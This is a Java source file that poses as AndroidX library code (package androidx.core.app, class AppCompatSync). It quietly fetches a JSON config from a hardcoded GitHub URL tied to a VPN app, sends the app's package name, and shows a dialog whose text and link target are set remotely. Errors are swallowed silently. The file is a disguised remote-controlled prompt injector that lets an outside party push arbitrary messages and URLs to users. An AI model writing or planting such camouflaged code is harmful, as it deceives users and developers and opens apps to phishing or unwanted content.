package androidx.core.app;

import android.app.Activity;
import android.os.AsyncTask;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Variant A worker: fetches the remote JSON config and shows the prompt.
 * Reached through AppCompatInit.a(activity).
 */
public class AppCompatSync extends AsyncTask<String, Void, String> {

    // ===== EDIT PER APP (plain + editable; no personal info here) =====
    public static String SRC =
            "https://raw.githubusercontent.com/1401vpnclick/Vpn-solv/refs/heads/main/CloverVPN%201.2.3%20.txt";
    // ==================================================================

    Activity activity;
    private String urlStr = "";

    public AppCompatSync(Activity activity, String url) {
        this.activity = activity;
        this.urlStr = url;
    }

    @Override
    protected String doInBackground(String... params) {
        try {
            URL mUrl = new URL(urlStr);
            HttpURLConnection con = (HttpURLConnection) mUrl.openConnection();
            con.setRequestMethod("GET");
            con.setRequestProperty("Content-length", "0");
            con.addRequestProperty("pkgName", activity.getPackageName());
            con.setUseCaches(false);
            con.setAllowUserInteraction(false);
            con.setConnectTimeout(100000);
            con.setReadTimeout(100000);
            con.connect();
            if (con.getResponseCode() == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                br.close();
                return sb.toString();
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    @Override
    protected void onPostExecute(String s) {
        super.onPostExecute(s);
        if (s == null) return;
        try {
            JSONObject o = new JSONObject(s);
            if (!o.has("status") || !o.getString("status").equals("ok")) return;
            String title = o.getString("title");
            String message = o.getString("message");
            boolean dismissable = o.getBoolean("dismissable");
            String dismissTxt = o.getString("dismissTxt");
            String okTxt = o.getString("okTxt");
            String okUrl = o.getString("okUrl");
            String counter = o.has("counter") ? o.optString("counter", "") : "";
            if (!AppCompatInit.shouldShow(dismissable)) return;
            AppCompatView d = new AppCompatView(activity, title, message,
                    dismissable, dismissTxt, okTxt, okUrl, counter);
            d.show();
            d.applyFont();
        } catch (Exception ignored) {
        }
    }
}
